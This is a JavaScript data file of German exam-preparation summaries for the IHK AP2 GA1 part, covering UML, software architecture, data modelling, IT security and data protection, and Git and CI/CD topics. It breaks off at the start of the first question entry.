// GA1 – Planen eines Softwareproduktes (technischer Teil)
// Topics: ga1-uml, ga1-architektur, ga1-datenmodell, ga1-sicherheit, ga1-devops
window.AP2 = window.AP2 || { topics: [], questions: [], exams: [], generators: [] };

AP2.topics.push(
  {
    id: "ga1-uml",
    part: "GA1",
    title: "UML-Diagramme",
    summary: `<h4>Überblick</h4>
<p>UML (Unified Modeling Language) unterscheidet <b>Strukturdiagramme</b> (Klassen-, Objekt-, Komponenten-, Verteilungs-, Paketdiagramm) und <b>Verhaltensdiagramme</b> (Use-Case-, Aktivitäts-, Zustandsdiagramm sowie die Interaktionsdiagramme Sequenz- und Kommunikationsdiagramm). In der AP2 kommen v.&nbsp;a. Use-Case, Klasse, Sequenz, Aktivität und Zustand dran – meist als „vervollständigen Sie“ oder „erstellen Sie“.</p>

<h4>Use-Case-Diagramm (Anwendungsfalldiagramm)</h4>
<ul>
<li><b>Akteur</b> (Strichmännchen): Rolle außerhalb des Systems (Person oder Fremdsystem), nie „Herr Meier“, sondern „Sachbearbeiter“.</li>
<li><b>Systemgrenze</b>: Rechteck mit Systemname, Use Cases (Ellipsen) liegen innerhalb, Akteure außerhalb.</li>
<li><b>Assoziation</b>: einfache Linie Akteur – Use Case.</li>
<li><b>«include»</b>: Basis-UC enthält <i>immer</i> den inkludierten UC. Gestrichelter Pfeil vom Basis-UC <b>zum</b> inkludierten UC.</li>
<li><b>«extend»</b>: erweiternder UC wird <i>optional/bedingt</i> ausgeführt (Extension Point, Bedingung). Gestrichelter Pfeil vom erweiternden UC <b>zum</b> Basis-UC.</li>
<li><b>Generalisierung</b>: Pfeil mit hohler Dreiecksspitze (z.&nbsp;B. Admin erbt von Mitarbeiter).</li>
</ul>
<pre>[Kunde] --- (Bestellung aufgeben) ..«include»..&gt; (Anmelden)
            (Gutschein einlösen)  ..«extend»..&gt;  (Bestellung aufgeben)</pre>

<h4>Klassendiagramm</h4>
<ul>
<li>Klasse: Name | Attribute | Methoden. Sichtbarkeit: <code>+</code> public, <code>-</code> private, <code>#</code> protected, <code>~</code> package.</li>
<li>Notation: <code>- name : String</code>, <code>+ berechne(menge : int) : double</code>. <u>Unterstrichen</u> = statisch; <i>kursiv</i> bzw. {abstract} = abstrakt; «interface» = Schnittstelle.</li>
<li><b>Assoziation</b> (Linie, ggf. Navigierbarkeit &rarr;), <b>Multiplizitäten</b>: <code>1</code>, <code>0..1</code>, <code>*</code> / <code>0..*</code>, <code>1..*</code>, <code>2..5</code>.</li>
<li><b>Aggregation</b> (hohle Raute am Ganzen): „hat“, Teile können ohne Ganzes existieren (Team – Spieler).</li>
<li><b>Komposition</b> (gefüllte Raute am Ganzen): existenzabhängig, Teil gehört genau zu einem Ganzen (Rechnung – Rechnungsposition). Multiplizität am Ganzen ist immer 1.</li>
<li><b>Vererbung/Generalisierung</b>: durchgezogene Linie, hohles Dreieck zur Oberklasse. <b>Realisierung</b> eines Interfaces: gestrichelte Linie, hohles Dreieck.</li>
<li><b>Abhängigkeit</b>: gestrichelter Pfeil („benutzt“).</li>
</ul>
<pre>Rechnung    1 &#9670;------ 1..* Rechnungsposition   (Komposition, gefüllte Raute)
Abteilung 0..1 &#9671;------ *    Mitarbeiter         (Aggregation, hohle Raute)
Kunde ------|&gt; Person                             (Vererbung, hohles Dreieck)
Kreditkarte - - -|&gt; «interface» Zahlungsmittel    (Realisierung)

PlantUML:  A *-- B  Komposition | A o-- B  Aggregation
           A &lt;|-- B Vererbung   | A &lt;|.. B Realisierung | A --&gt; B gerichtete Assoziation</pre>

<h4>Sequenzdiagramm</h4>
<ul>
<li>Objekte/Rollen oben (<code>:Klasse</code> oder <code>obj:Klasse</code>), darunter gestrichelte <b>Lebenslinie</b>, Aktivierungsbalken = Objekt ist aktiv.</li>
<li><b>Synchrone Nachricht</b>: durchgezogene Linie, gefüllte Pfeilspitze (Sender wartet). <b>Asynchron</b>: offene Pfeilspitze. <b>Rückgabe</b>: gestrichelt, offene Spitze. Erzeugung: gestrichelt «create», Objekt beginnt weiter unten; Zerstörung: X am Ende der Lebenslinie.</li>
<li>Kombinierte Fragmente: <b>alt</b> (if/else, mehrere Operanden mit [Guard]), <b>opt</b> (if ohne else), <b>loop</b> (Schleife, z.&nbsp;B. loop [für jede Position]), <b>par</b> (parallel), <b>ref</b> (Verweis auf anderes Diagramm).</li>
</ul>

<h4>Aktivitätsdiagramm</h4>
<ul>
<li>Startknoten (gefüllter Kreis), Endknoten (Kreis mit Punkt, „Bullauge“), Ablaufende (Kreis mit X).</li>
<li>Aktion: abgerundetes Rechteck. <b>Entscheidung/Zusammenführung</b>: Raute mit [Guards] – Guards müssen sich ausschließen und vollständig sein.</li>
<li><b>Gabelung (Fork)/Vereinigung (Join)</b>: dicker Balken, parallele Abläufe; Join wartet auf alle eingehenden Flüsse.</li>
<li><b>Swimlanes</b> (Aktivitätsbereiche/Partitionen): Zuständigkeit pro Rolle/Abteilung/System.</li>
</ul>

<h4>Zustandsdiagramm</h4>
<ul>
<li>Zustand: abgerundetes Rechteck, ggf. mit <code>entry/</code>, <code>do/</code>, <code>exit/</code>.</li>
<li>Transition: Pfeil, Beschriftung <code>ereignis [guard] / aktion</code>, z.&nbsp;B. <code>bezahlen [betrag &gt;= offen] / quittungDrucken()</code>.</li>
<li>Startzustand (gefüllter Kreis), Endzustand (Bullauge). Immer prüfen: Ist jeder Zustand erreichbar? Gibt es Sackgassen?</li>
</ul>

<h4>Komponenten- &amp; Verteilungsdiagramm</h4>
<ul>
<li><b>Komponentendiagramm</b>: logische Softwarebausteine mit angebotenen (Lollipop) und benötigten (Socket/Halbkreis) Schnittstellen.</li>
<li><b>Verteilungsdiagramm</b>: physische Knoten («device», «executionEnvironment») als Quader, darauf Artefakte (.war, .jar), Kommunikationspfade mit Protokoll (HTTPS, JDBC).</li>
</ul>

<h4>Typische Prüfungsfallen</h4>
<ul>
<li>include/extend-Pfeilrichtung vertauscht; Akteur innerhalb der Systemgrenze.</li>
<li>Raute an der falschen Seite (Raute gehört immer ans <b>Ganze</b>).</li>
<li>Multiplizität „vertauscht“: Die Zahl steht am <b>gegenüberliegenden</b> Ende („Ein Kunde hat 0..* Bestellungen“ → 0..* steht bei Bestellung).</li>
<li>Rückgabenachrichten im Sequenzdiagramm vergessen; Guards in Aktivitätsdiagrammen nicht disjunkt; Parallelität mit Raute statt Balken.</li>
</ul>`
  },
  {
    id: "ga1-architektur",
    part: "GA1",
    title: "Softwarearchitektur, Schnittstellen & Entwurfsmuster",
    summary: `<h4>Architekturstile</h4>
<ul>
<li><b>3-Schichten-Architektur</b>: Präsentationsschicht (UI) – Logikschicht (Geschäftslogik) – Datenhaltungsschicht (Persistenz). Jede Schicht nutzt nur die darunterliegende. Vorteile: Austauschbarkeit, Wartbarkeit, Testbarkeit, Arbeitsteilung, Skalierung. Nachteil: Overhead, ggf. Performance.</li>
<li><b>MVC</b>: Model (Daten + Logik), View (Darstellung), Controller (nimmt Eingaben entgegen, steuert Model/View). <b>MVVM</b>: ViewModel stellt bindbare Daten/Commands bereit, View bindet per Data Binding (WPF, Angular, Android Jetpack).</li>
<li><b>Client-Server</b>: Client fordert Dienst an, Server stellt bereit. <b>Fat Client</b>: Logik auf Client (offlinefähig, hohe Anforderungen an Client, aufwendige Verteilung). <b>Thin Client</b>: nur Darstellung (Browser), zentrale Wartung, Netzabhängigkeit.</li>
<li><b>Monolith</b>: eine Deployment-Einheit – einfach zu entwickeln/testen, schwer zu skalieren und zu ändern. <b>Microservices</b>: kleine, unabhängig deploybare Dienste je fachlicher Domäne, eigene DB, Kommunikation über REST/Messaging – skalierbar, technologieoffen, aber verteilte Komplexität (Netzwerk, Monitoring, Konsistenz).</li>
<li><b>Middleware</b>: vermittelnde Software zwischen Anwendungen (Message Broker wie RabbitMQ/Kafka, Application Server, ESB).</li>
</ul>
<pre>Browser (Präsentation) ──HTTPS/JSON──▶ Backend (Logik) ──SQL/ORM──▶ DB (Daten)</pre>

<h4>REST</h4>
<ul>
<li>Ressourcenorientiert, URI identifiziert Ressource (<code>/kunden/42/bestellungen</code>, Substantive im Plural), zustandslos (stateless), einheitliche Schnittstelle, cachebar, meist JSON.</li>
<li>HTTP-Methoden: <b>GET</b> lesen (sicher, idempotent), <b>POST</b> anlegen (nicht idempotent), <b>PUT</b> vollständig ersetzen (idempotent), <b>PATCH</b> teilweise ändern, <b>DELETE</b> löschen (idempotent).</li>
<li><b>Idempotent</b> = mehrfaches Ausführen hat dieselbe Wirkung wie einmaliges.</li>
<li>Statuscodes: 200 OK, 201 Created (+ Location-Header), 204 No Content, 301/302 Redirect, 304 Not Modified, 400 Bad Request, 401 Unauthorized (nicht authentifiziert), 403 Forbidden (keine Berechtigung), 404 Not Found, 409 Conflict, 422 Unprocessable Entity, 500 Internal Server Error, 503 Service Unavailable.</li>
<li><b>SOAP</b>: XML-Protokoll mit WSDL-Vertrag, WS-Security, strenger, schwergewichtiger; REST: leichtgewichtig, flexibel, JSON.</li>
<li>API-Design: Versionierung (<code>/api/v1</code>), Pagination, Filter per Query-Parameter, einheitliche Fehlerobjekte, Dokumentation mit OpenAPI/Swagger.</li>
</ul>

<h4>Web-Grundlagen</h4>
<ul>
<li>HTTP ist zustandslos → Zustand über <b>Session</b> (Server speichert, Client hält Session-ID im Cookie) oder <b>Token</b> (z.&nbsp;B. <b>JWT</b>: Header.Payload.Signature, Base64URL-kodiert, signiert, <i>nicht verschlüsselt</i>; Server muss nichts speichern).</li>
<li>HTTPS = HTTP über TLS (Vertraulichkeit, Integrität, Server-Authentizität), Port 443.</li>
<li>Cookies: Flags <code>Secure</code>, <code>HttpOnly</code>, <code>SameSite</code>.</li>
</ul>

<h4>Entwurfsmuster (GoF)</h4>
<table>
<tr><th>Muster</th><th>Art</th><th>Zweck</th></tr>
<tr><td>Singleton</td><td>Erzeugung</td><td>genau eine Instanz, globaler Zugriff (privater Konstruktor, statische getInstance())</td></tr>
<tr><td>Factory (Method)</td><td>Erzeugung</td><td>Objekterzeugung kapseln, Fabrik/Unterklasse entscheidet, welche Klasse</td></tr>
<tr><td>Adapter</td><td>Struktur</td><td>inkompatible Schnittstelle an erwartete anpassen</td></tr>
<tr><td>Facade</td><td>Struktur</td><td>vereinfachte Schnittstelle zu einem komplexen Subsystem</td></tr>
<tr><td>Decorator</td><td>Struktur</td><td>Funktionalität dynamisch hinzufügen, ohne Vererbung</td></tr>
<tr><td>Observer</td><td>Verhalten</td><td>Subjekt benachrichtigt registrierte Beobachter bei Änderung (Publish/Subscribe)</td></tr>
<tr><td>Strategy</td><td>Verhalten</td><td>austauschbare Algorithmen hinter gemeinsamer Schnittstelle</td></tr>
</table>
<p><b>Dependency Injection</b>: Abhängigkeiten werden von außen übergeben (Konstruktor/Setter), statt sie selbst mit <code>new</code> zu erzeugen → lose Kopplung, Testbarkeit (Mocks). Frameworks: Spring, .NET.</p>

<h4>Frameworks, Plattformen, Persistenz</h4>
<ul>
<li><b>Bibliothek</b>: Mein Code ruft die Bibliothek auf. <b>Framework</b>: Framework ruft meinen Code auf (Inversion of Control, „Hollywood-Prinzip“).</li>
<li><b>Native App</b> (Swift/Kotlin): volle Hardwarenutzung, beste Performance, aber je Plattform eigene Codebasis. <b>Web-App</b>: plattformunabhängig, keine Installation, eingeschränkter Hardwarezugriff. <b>Hybrid/Cross-Plattform</b> (Flutter, React Native, Ionic): eine Codebasis, App-Store-fähig. <b>PWA</b>: Web-App mit Service Worker (offline), installierbar, Push.</li>
<li><b>ORM</b> (Hibernate/JPA, Entity Framework): bildet Klassen auf Tabellen ab, weniger SQL-Boilerplate, DB-Unabhängigkeit; Gefahr: N+1-Problem, Performance. Alternativ direkter Zugriff über JDBC/ODBC mit Prepared Statements.</li>
</ul>

<h4>Typische Fallen</h4>
<ul><li>401 vs. 403 verwechseln. POST ist <b>nicht</b> idempotent. JWT ist nicht verschlüsselt. Facade ≠ Adapter (Facade vereinfacht, Adapter übersetzt).</li></ul>`
  },
  {
    id: "ga1-datenmodell",
    part: "GA1",
    title: "Datenmodellierung (ERM, Relationenmodell, Normalisierung)",
    summary: `<h4>Entity-Relationship-Modell (ERM)</h4>
<ul>
<li><b>Entität</b> (Rechteck): Objekt der realen Welt (Kunde). <b>Attribut</b> (Ellipse in Chen): Eigenschaft; Schlüsselattribut unterstrichen. <b>Beziehung</b> (Raute in Chen): z.&nbsp;B. „bestellt“.</li>
<li><b>Chen-Notation</b>: Kardinalitäten 1, n, m an den Linien (1:1, 1:n, n:m).</li>
<li><b>Krähenfuß / IE-Notation</b> (Information Engineering): Symbole am Linienende: <code>|</code> = genau eins, <code>o</code> = null, Krähenfuß <code>&lt;</code> = viele. <code>||</code> genau 1, <code>o|</code> 0..1, <code>|&lt;</code> 1..n, <code>o&lt;</code> 0..n.</li>
<li><b>MC-Notation</b> (1, c, m, mc) und (min,max)-Notation kommen auch vor – Achtung: (min,max) steht auf der „eigenen“ Seite.</li>
</ul>
<pre>KUNDE ||-----o&lt; BESTELLUNG     ein Kunde hat 0..n Bestellungen,
                              jede Bestellung gehört zu genau 1 Kunde</pre>

<h4>Überführung ERM → Relationenmodell</h4>
<ul>
<li>Jede Entität → Tabelle, Schlüsselattribut → <b>Primärschlüssel (PK)</b>.</li>
<li><b>1:n</b>: PK der 1-Seite wird <b>Fremdschlüssel (FK)</b> in der n-Seite.</li>
<li><b>1:1</b>: FK in eine der beiden Tabellen (meist die optionale Seite), mit UNIQUE; ggf. zusammenlegen.</li>
<li><b>n:m</b>: <b>Zwischentabelle</b> (Verbindungs-/Koppeltabelle) mit beiden FKs, die zusammen den <b>zusammengesetzten PK</b> bilden; Beziehungsattribute (Menge, Datum) gehören in die Zwischentabelle.</li>
</ul>
<pre>Kunde(<u>KundeID</u>, Name, PLZ, Ort)
Bestellung(<u>BestellID</u>, Datum, ↑KundeID)
Artikel(<u>ArtNr</u>, Bezeichnung, Preis)
Bestellposition(<u>↑BestellID, ↑ArtNr</u>, Menge)</pre>
<p>Notation: PK unterstrichen, FK mit ↑ oder # oder „FK“ kennzeichnen.</p>

<h4>Normalisierung</h4>
<ul>
<li><b>1. NF</b>: alle Attribute <b>atomar</b> (keine Listen, keine zusammengesetzten Werte wie „Max Mustermann, 12345 Köln“), keine Wiederholungsgruppen.</li>
<li><b>2. NF</b>: 1. NF + jedes Nichtschlüsselattribut ist <b>voll funktional</b> vom <i>gesamten</i> Primärschlüssel abhängig (nur relevant bei zusammengesetztem PK; keine partielle Abhängigkeit).</li>
<li><b>3. NF</b>: 2. NF + keine <b>transitiven</b> Abhängigkeiten (Nichtschlüsselattribut hängt von anderem Nichtschlüsselattribut ab, z.&nbsp;B. PLZ → Ort).</li>
<li><b>BCNF</b>: jede Determinante ist Schlüsselkandidat (verschärfte 3. NF).</li>
<li>Merksatz: „Der Schlüssel, der ganze Schlüssel und nichts als der Schlüssel.“</li>
</ul>

<h4>Anomalien (bei nicht normalisierten Tabellen)</h4>
<ul>
<li><b>Einfügeanomalie</b>: Daten können nicht ohne andere Daten eingefügt werden (neuer Artikel ohne Bestellung).</li>
<li><b>Änderungsanomalie</b>: redundante Daten müssen an mehreren Stellen geändert werden → Inkonsistenz.</li>
<li><b>Löschanomalie</b>: Beim Löschen gehen ungewollt andere Informationen verloren (letzte Bestellung löschen → Kunde weg).</li>
</ul>

<h4>Integrität &amp; Datentypen</h4>
<ul>
<li><b>Referentielle Integrität</b>: FK-Werte müssen in der referenzierten Tabelle existieren (oder NULL). Aktionen: ON DELETE RESTRICT / CASCADE / SET NULL.</li>
<li>Entitätsintegrität: PK eindeutig und NOT NULL. Domänenintegrität: passende Datentypen + CHECK.</li>
<li>Datentypen: INTEGER, DECIMAL(10,2) für Geld (nie FLOAT!), VARCHAR(n), CHAR(n) für feste Länge (PLZ als CHAR(5), nicht INT – führende Null!), DATE, DATETIME/TIMESTAMP, BOOLEAN, BLOB.</li>
<li><b>Denormalisierung</b>: bewusste Redundanz für Performance (Reporting, Data Warehouse), mit Konsistenzrisiko.</li>
</ul>

<h4>NoSQL</h4>
<table>
<tr><th>Art</th><th>Beispiel</th><th>Einsatz</th></tr>
<tr><td>Dokument</td><td>MongoDB, CouchDB</td><td>flexible JSON-Dokumente, Produktkataloge, CMS</td></tr>
<tr><td>Key-Value</td><td>Redis, DynamoDB</td><td>Caching, Sessions, Warenkorb</td></tr>
<tr><td>Spaltenorientiert (Wide Column)</td><td>Cassandra, HBase</td><td>große Datenmengen, Zeitreihen, Logs, hohe Schreiblast</td></tr>
<tr><td>Graph</td><td>Neo4j</td><td>stark vernetzte Daten: soziale Netze, Empfehlungen, Routen</td></tr>
</table>
<p>NoSQL: schemafrei/flexibel, horizontal skalierbar, oft BASE statt ACID (eventual consistency, CAP-Theorem).</p>`
  },
  {
    id: "ga1-sicherheit",
    part: "GA1",
    title: "IT-Sicherheit & Datenschutz",
    summary: `<h4>Schutzziele</h4>
<ul>
<li><b>Vertraulichkeit</b>: nur Befugte haben Zugriff (Verschlüsselung, Zugriffskontrolle).</li>
<li><b>Integrität</b>: Daten sind unverändert/korrekt (Hash, Signatur, Prüfsummen).</li>
<li><b>Verfügbarkeit</b>: Systeme/Daten stehen bei Bedarf zur Verfügung (Redundanz, Backup, USV).</li>
<li>Erweitert: <b>Authentizität</b> (Echtheit/Herkunft), <b>Nichtabstreitbarkeit/Verbindlichkeit</b> (digitale Signatur), Zurechenbarkeit.</li>
</ul>

<h4>DSGVO / BDSG</h4>
<ul>
<li><b>Personenbezogene Daten</b>: alle Infos zu einer identifizierten/identifizierbaren natürlichen Person (Name, E-Mail, IP-Adresse, Kundennr.). <b>Besondere Kategorien (Art. 9)</b>: Gesundheit, ethnische Herkunft, politische Meinung, Religion, Gewerkschaft, Genetik, Biometrie, Sexualleben – grundsätzlich verboten, nur mit Ausnahme (z.&nbsp;B. ausdrückliche Einwilligung).</li>
<li><b>Grundsätze Art. 5</b>: Rechtmäßigkeit, Treu und Glauben, Transparenz; Zweckbindung; Datenminimierung; Richtigkeit; Speicherbegrenzung; Integrität und Vertraulichkeit; Rechenschaftspflicht.</li>
<li><b>Rechtmäßigkeit Art. 6</b>: Einwilligung, Vertragserfüllung, rechtliche Verpflichtung, lebenswichtige Interessen, öffentliche Aufgabe, berechtigtes Interesse.</li>
<li><b>Betroffenenrechte</b>: Information (Art. 13/14), Auskunft (15), Berichtigung (16), Löschung/„Vergessenwerden“ (17), Einschränkung (18), Datenübertragbarkeit (20), Widerspruch (21).</li>
<li><b>Auftragsverarbeitung (Art. 28)</b>: Dienstleister verarbeitet weisungsgebunden → AV-Vertrag nötig (z.&nbsp;B. Cloud-Hoster).</li>
<li><b>Privacy by Design / by Default (Art. 25)</b>: Datenschutz durch Technikgestaltung und datenschutzfreundliche Voreinstellungen.</li>
<li><b>Meldepflicht (Art. 33)</b>: Datenpanne binnen <b>72 Stunden</b> an die Aufsichtsbehörde; bei hohem Risiko auch Betroffene informieren (Art. 34).</li>
<li><b>Bußgelder (Art. 83)</b>: bis 20 Mio. € oder 4 % des weltweiten Jahresumsatzes (der höhere Betrag); geringere Stufe 10 Mio. €/2 %.</li>
<li><b>TOMs (Art. 32)</b>: technische und organisatorische Maßnahmen, z.&nbsp;B. Zutritts-, Zugangs-, Zugriffs-, Weitergabe-, Eingabe-, Verfügbarkeitskontrolle, Verschlüsselung, Pseudonymisierung.</li>
<li><b>Pseudonymisierung</b>: Personenbezug über Zusatzinfo (Schlüsseltabelle) wiederherstellbar → bleibt personenbezogen. <b>Anonymisierung</b>: Personenbezug unwiderruflich entfernt → DSGVO gilt nicht mehr.</li>
</ul>

<h4>BSI IT-Grundschutz</h4>
<p>Methodik (BSI-Standards 200-1 bis 200-4) + IT-Grundschutz-Kompendium (Bausteine). Ablauf: Strukturanalyse → <b>Schutzbedarfsfeststellung</b> (normal / hoch / sehr hoch je Schutzziel, Maximumprinzip, Kumulations- und Verteilungseffekt) → Modellierung → IT-Grundschutz-Check → Risikoanalyse → Umsetzung.</p>

<h4>Kryptografie</h4>
<ul>
<li><b>Symmetrisch</b> (AES, ChaCha20): ein gemeinsamer Schlüssel, schnell, Problem Schlüsselaustausch; n·(n-1)/2 Schlüssel.</li>
<li><b>Asymmetrisch</b> (RSA, ECC): Schlüsselpaar öffentlich/privat; mit Public Key des Empfängers verschlüsseln, mit seinem Private Key entschlüsseln; langsam; 2·n Schlüssel.</li>
<li><b>Hybrid</b> (TLS, PGP): symmetrischer Sitzungsschlüssel wird asymmetrisch ausgetauscht.</li>
<li><b>Hashfunktion</b> (SHA-256, SHA-3): Einwegfunktion, feste Länge, kollisionsresistent – Integrität. MD5/SHA-1 gelten als unsicher.</li>
<li><b>Passwortspeicherung</b>: niemals Klartext/unsalted Hash. <b>Salt</b> (zufällig je Nutzer, in DB gespeichert) gegen Rainbow Tables, <b>Pepper</b> (geheimer, systemweiter Wert außerhalb der DB). Langsame Verfahren: <b>bcrypt, scrypt, Argon2</b>, PBKDF2.</li>
<li><b>Digitale Signatur</b>: Hash des Dokuments mit dem <i>privaten</i> Schlüssel des Absenders signieren; Prüfung mit dessen <i>öffentlichem</i> Schlüssel → Integrität, Authentizität, Nichtabstreitbarkeit.</li>
<li><b>Zertifikat/PKI</b>: X.509-Zertifikat bindet Public Key an Identität, signiert von einer CA; Vertrauenskette Root-CA → Intermediate → Server.</li>
<li><b>TLS</b>: Handshake (Zertifikatsprüfung, Schlüsselaustausch), danach symmetrisch verschlüsselt. TLS 1.2/1.3 verwenden.</li>
</ul>

<h4>OWASP Top 10 &amp; Gegenmaßnahmen</h4>
<ul>
<li><b>Broken Access Control</b> (Platz 1): serverseitige Rechteprüfung, Least Privilege, deny by default.</li>
<li><b>Injection/SQL-Injection</b>: <b>Prepared Statements</b>/parametrisierte Queries, ORM, Eingabevalidierung (Whitelist), minimale DB-Rechte.</li>
<li><b>XSS</b>: <b>Output-Encoding</b>/Escaping, Content Security Policy, HttpOnly-Cookies.</li>
<li><b>CSRF</b>: CSRF-Token, SameSite-Cookies, Re-Authentifizierung.</li>
<li>Weitere: Cryptographic Failures, Insecure Design, Security Misconfiguration, Vulnerable Components, Authentication Failures, Integrity Failures, Logging &amp; Monitoring Failures, SSRF.</li>
</ul>

<h4>Authentifizierung &amp; Autorisierung</h4>
<ul>
<li><b>Authentifizierung</b> = Wer bist du? (Nachweis der Identität). <b>Autorisierung</b> = Was darfst du? (Rechte).</li>
<li><b>MFA</b>: mind. zwei Faktoren aus verschiedenen Kategorien: Wissen (Passwort), Besitz (Smartphone, Token), Inhärenz (Fingerabdruck).</li>
<li><b>RBAC</b> (rollenbasiert): Rechte an Rollen, Nutzer erhalten Rollen. Need-to-know, Least Privilege, Vier-Augen-Prinzip.</li>
</ul>

<h4>Backup &amp; Logging</h4>
<ul>
<li><b>Vollsicherung</b>: alles, langsam, einfache Wiederherstellung. <b>Inkrementell</b>: Änderungen seit der <i>letzten Sicherung</i> (egal welcher Art) – schnell, kleine Sicherung, Restore braucht Voll + alle Inkremente. <b>Differenziell</b>: Änderungen seit der <i>letzten Vollsicherung</i> – Restore braucht Voll + letzte Differenzielle.</li>
<li><b>3-2-1-Regel</b>: 3 Kopien, 2 verschiedene Medien, 1 extern/offsite (ggf. offline/immutable gegen Ransomware).</li>
<li>Logging: sicherheitsrelevante Ereignisse protokollieren (Logins, Rechteänderungen), keine Passwörter loggen, Logs manipulationssicher und datenschutzkonform aufbewahren.</li>
</ul>`
  },
  {
    id: "ga1-devops",
    part: "GA1",
    title: "Versionsverwaltung, CI/CD, Betrieb & Einführung",
    summary: `<h4>Git</h4>
<ul>
<li><b>Verteiltes</b> VCS: jeder hat das komplette Repository lokal (vs. zentral: SVN).</li>
<li>Bereiche: Working Directory → <code>git add</code> → Staging Area (Index) → <code>git commit</code> → lokales Repo → <code>git push</code> → Remote.</li>
<li>Wichtige Befehle: <code>git init</code>, <code>git clone &lt;url&gt;</code>, <code>git status</code>, <code>git log</code>, <code>git diff</code>, <code>git switch -c feature/x</code> bzw. <code>git checkout -b</code>, <code>git merge</code>, <code>git rebase</code>, <code>git pull</code> (= fetch + merge), <code>git fetch</code>, <code>git stash</code>, <code>git revert</code> (neuer Gegen-Commit), <code>git reset</code>, <code>git tag v1.0.0</code>.</li>
<li><b>Merge</b>: führt Branches zusammen, erzeugt ggf. Merge-Commit, Historie bleibt erhalten. <b>Rebase</b>: setzt eigene Commits auf neue Basis → lineare Historie, schreibt Historie um (nie auf geteilten Branches!).</li>
<li><b>Merge-Konflikt</b>: gleiche Stelle in beiden Branches geändert → Markierungen <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>, <code>=======</code>, <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code> manuell auflösen, add, commit.</li>
<li><b>Pull Request / Merge Request</b>: Änderungen zur Übernahme vorschlagen, Code-Review, automatische Checks (CI) vor dem Merge.</li>
<li>Branching-Strategien: <b>GitFlow</b> (main, develop, feature/*, release/*, hotfix/*) – für geplante Releases; <b>Trunk-Based</b> (kurzlebige Branches, häufig in main, Feature Toggles) – für CI/CD; GitHub Flow (main + Feature-Branches + PR).</li>
<li>Semantic Versioning: MAJOR.MINOR.PATCH (inkompatibel . neue Funktion . Bugfix).</li>
</ul>
<pre>main    ──●───────────●── (v1.1)
           \\         /
feature/x   ●──●──●──    (Pull Request + Review → merge)</pre>

<h4>CI/CD</h4>
<ul>
<li><b>Continuous Integration</b>: häufiges Integrieren, jeder Push löst automatischen Build + Tests aus.</li>
<li><b>Continuous Delivery</b>: jederzeit auslieferbar, Produktiv-Deployment per manueller Freigabe. <b>Continuous Deployment</b>: automatisch bis Produktion.</li>
<li>Pipeline-Stufen: Checkout → Build/Compile → Unit-Tests → statische Codeanalyse (SonarQube, Linter) → Packaging (Artefakt/Container-Image) → Integrationstests → Deployment Staging → Akzeptanz-/E2E-Tests → Deployment Produktion → Monitoring.</li>
<li>Tools: Jenkins, GitLab CI, GitHub Actions, Azure DevOps. Build-Tools: Maven, Gradle (Java), npm (JS), MSBuild/dotnet (C#), Make.</li>
</ul>

<h4>Container &amp; Cloud</h4>
<ul>
<li><b>VM</b>: Hypervisor virtualisiert Hardware, jede VM eigenes Gast-Betriebssystem → stärkere Isolation, mehr Ressourcen, langsamer Start.</li>
<li><b>Container (Docker)</b>: teilen sich den Kernel des Host-OS, enthalten nur App + Abhängigkeiten → leichtgewichtig, Start in Sekunden, „läuft überall gleich“. Image (Bauplan, Dockerfile) vs. Container (laufende Instanz). Orchestrierung: Kubernetes.</li>
<li><b>Servicemodelle</b>: <b>IaaS</b> (VMs, Netz, Speicher – Kunde verwaltet OS aufwärts), <b>PaaS</b> (Laufzeitumgebung – Kunde liefert nur App/Daten), <b>SaaS</b> (fertige Anwendung, z.&nbsp;B. Microsoft 365).</li>
<li><b>Bereitstellungsmodelle</b>: Public, Private, Hybrid, Community Cloud. Datenschutz: Serverstandort EU, AV-Vertrag.</li>
</ul>

<h4>Deployment-Strategien</h4>
<ul>
<li><b>Blue-Green</b>: zwei identische Umgebungen, Umschalten per Load Balancer, sofortiger Rollback; doppelte Ressourcen.</li>
<li><b>Canary</b>: neue Version erst für kleinen Nutzeranteil (z.&nbsp;B. 5 %), schrittweise erhöhen bei guten Metriken.</li>
<li><b>Rolling</b>: Instanzen nacheinander aktualisieren, kein Downtime, zeitweise zwei Versionen parallel.</li>
<li><b>Monitoring</b>: Metriken (CPU, Antwortzeit, Fehlerrate), Logs (ELK), Tracing, Alerting (Prometheus, Grafana).</li>
</ul>

<h4>Softwarelizenzen</h4>
<ul>
<li><b>Proprietär</b>: Quellcode geschlossen, Nutzungsrechte per EULA.</li>
<li><b>Open Source</b>: Quellcode offen, freie Nutzung/Änderung/Weitergabe.</li>
<li><b>GPL</b> (starkes <b>Copyleft</b>): abgeleitete Werke, die verbreitet werden, müssen ebenfalls unter GPL inkl. Quellcode stehen. <b>LGPL</b>: schwaches Copyleft (Linken erlaubt). <b>AGPL</b>: auch bei Nutzung über Netzwerk (SaaS).</li>
<li><b>Permissiv</b>: <b>MIT</b> (fast alles erlaubt, Lizenz-/Copyrighthinweis beibehalten), <b>Apache 2.0</b> (wie MIT + Patentlizenz + Änderungen kennzeichnen), BSD.</li>
<li>Freeware (kostenlos, nicht offen), Shareware (Testversion).</li>
</ul>

<h4>Dokumentation, Migration, Einführung</h4>
<ul>
<li><b>Benutzerdoku</b> (Handbuch, Online-Hilfe, FAQ), <b>Entwicklerdoku</b> (Architektur, API-Doku, Code-Kommentare, Javadoc, README), <b>Betriebs-/Administratorendoku</b> (Installation, Konfiguration, Backup, Notfallhandbuch).</li>
<li><b>Datenmigration</b>: Analyse Altdaten → Mapping → Bereinigung → Testmigration → Validierung (Datensatzzahlen, Stichproben) → Echtmigration → Abnahme; ETL (Extract, Transform, Load).</li>
<li><b>Einführungsstrategien</b>: <b>Big Bang/Stichtag</b> (alles auf einmal – schnell, günstig, hohes Risiko), <b>Parallelbetrieb</b> (Alt + Neu parallel – sicher, doppelter Aufwand), <b>stufenweise/schrittweise</b> (modul- oder standortweise – geringes Risiko, lange Dauer, Schnittstellen zwischen Alt und Neu), <b>Pilotbetrieb</b> (erst eine Abteilung).</li>
<li><b>Schulung</b>: zielgruppengerecht (Key-User, Endanwender, Admins), Train-the-Trainer, E-Learning, Präsenz, Schulungsumgebung mit Testdaten.</li>
</ul>`
  }
);

// ===================== ga1-uml =====================
AP2.questions.push(
  {
    id: "ga1-uml-001", part: "GA1", topic: "ga1-uml", type: "mc", difficulty: 1, points: 2,
